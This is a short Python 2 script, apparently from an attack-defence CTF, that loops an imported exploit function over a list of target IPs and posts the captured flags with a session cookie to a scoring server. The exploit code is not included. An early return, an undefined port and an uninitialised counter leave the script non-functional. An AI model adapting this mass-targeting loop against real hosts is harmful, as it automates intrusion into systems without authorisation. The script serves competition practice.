#!/usr/bin/env python
# encoding: utf-8

import requests
import time
from pwn import *
from attack_pwn import attack_pwn
from multiprocessing import Pool


# get flag and auto submit.
# using multi thread
def auto(ip):
    try:
        print ip
        return 0
        flag = attack_pwn(ip, port)
        cookie = "PHPSESSID=r1ok5mqncr2dgem41mibqg05l3"
        r = requests.post(
            'http://192.168.168.102/judgead.php',
            data={"flag": flag,
                  "number": 2},
            headers={"Cookie": cookie})
        print r.content
        if 'ok' in r.content:
            count += 1
        time.sleep(3)

    except Exception, e:
        print '[!]error', ip
        print '[!]error', e


if __name__ == '__main__':
    while True:
        f = open('ip.txt')
        ip = f.read().strip('\n\r ').split('\n')
        f.close()
        pool = Pool()
        pool.map(auto, ip)
        pool.close()
        pool.join()
        time.sleep(7)
